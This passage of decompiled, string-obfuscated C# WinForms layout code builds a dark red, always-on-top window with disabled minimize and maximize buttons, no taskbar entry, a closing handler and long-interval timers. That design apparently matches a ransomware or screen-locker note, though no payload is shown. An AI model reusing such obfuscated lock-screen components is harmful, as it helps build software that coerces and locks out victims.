		((Control)label_12).set_Font(new Font(GClass2.smethod_0("Yźɱ\u0363ѿռ١ݫ\u0878फਖ਼୨౦൴ฦབၡᅱቫ፧"), 14.25f, (FontStyle)1, (GraphicsUnit)3, (byte)238));
		((Control)label_12).set_ForeColor(Color.Black);
		((Control)label_12).set_Location(new Point(229, 309));
		((Control)label_12).set_Name(GClass2.smethod_0("kŧɧ\u0361ѯԳط"));
		((Control)label_12).set_Size(new Size(0, 24));
		((Control)label_12).set_TabIndex(16);
		((Control)label_13).set_AutoSize(true);
		((Control)label_13).set_BackColor(Color.White);
		((Control)label_13).set_Font(new Font(GClass2.smethod_0("Yźɱ\u0363ѿռ١ݫ\u0878फਖ਼୨౦൴ฦབၡᅱቫ፧"), 14.25f, (FontStyle)1, (GraphicsUnit)3, (byte)238));
		((Control)label_13).set_ForeColor(Color.Black);
		((Control)label_13).set_Location(new Point(229, 355));
		((Control)label_13).set_Name(GClass2.smethod_0("kŧɧ\u0361ѯԳض"));
		((Control)label_13).set_Size(new Size(69, 24));
		((Control)label_13).set_TabIndex(17);
		((Control)label_13).set_Text(GClass2.smethod_0("ZŲɪ\u0360ѷԹ؏܋"));
		((Control)label_14).set_AutoSize(true);
		((Control)label_14).set_BackColor(Color.White);
		((Control)label_14).set_Font(new Font(GClass2.smethod_0("Yźɱ\u0363ѿռ١ݫ\u0878फਖ਼୨౦൴ฦབၡᅱቫ፧"), 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)label_14).set_ForeColor(Color.Black);
		((Control)label_14).set_Location(new Point(230, 379));
		((Control)label_14).set_Name(GClass2.smethod_0("kŧɧ\u0361ѯԳع"));
		((Control)label_14).set_Size(new Size(388, 96));
		((Control)label_14).set_TabIndex(18);
		((Control)label_14).set_Text(componentResourceManager.GetString(GClass2.smethod_0("`Ūɨ\u036cѤԶؾܫࡐ०\u0a7a୵")));
		timer_2.set_Enabled(true);
		timer_2.add_Tick((EventHandler)timer_2_Tick);
		timer_3.set_Enabled(true);
		timer_3.set_Interval(36000000);
		timer_3.add_Tick((EventHandler)timer_3_Tick);
		timer_4.set_Enabled(true);
		timer_4.add_Tick((EventHandler)timer_4_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_AutoSizeMode((AutoSizeMode)0);
		((Control)this).set_BackColor(Color.DarkRed);
		((Form)this).set_ClientSize(new Size(994, 653));
		((Control)this).get_Controls().Add((Control)(object)label_14);
		((Control)this).get_Controls().Add((Control)(object)label_13);
		((Control)this).get_Controls().Add((Control)(object)label_12);
		((Control)this).get_Controls().Add((Control)(object)label_11);
		((Control)this).get_Controls().Add((Control)(object)label_10);
		((Control)this).get_Controls().Add((Control)(object)label_8);
		((Control)this).get_Controls().Add((Control)(object)label_7);
		((Control)this).get_Controls().Add((Control)(object)label_6);
		((Control)this).get_Controls().Add((Control)(object)panel_0);
		((Control)this).get_Controls().Add((Control)(object)label_2);
		((Control)this).get_Controls().Add((Control)(object)label_0);
		((Control)this).get_Controls().Add((Control)(object)label_1);
		((Control)this).get_Controls().Add((Control)(object)textBox_0);
		((Control)this).get_Controls().Add((Control)(object)pictureBox_0);
		((Control)this).get_Controls().Add((Control)(object)panel_1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject(GClass2.smethod_0(".Žɠ\u036eѵԫ\u064dݠ\u086d९")));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name(GClass2.smethod_0("Cūɱ\u036fа"));
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text(GClass2.smethod_0("OŤɨͻѩ\u0558يݪࡧ२੧୳"));
		((Form)this).set_TopMost(true);
		((Form)this).add_FormClosing(new FormClosingEventHandler(GForm0_FormClosing));
		((Form)this).add_Load((EventHandler)GForm0_Load);
		((ISupportInitialize)pictureBox_0).EndInit();
		((Control)panel_0).ResumeLayout(false);
		((Control)panel_0).PerformLayout();
		((Control)panel_1).ResumeLayout(false);
		((Control)panel_1).PerformLayout();
		((ISupportInitialize)pictureBox_1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
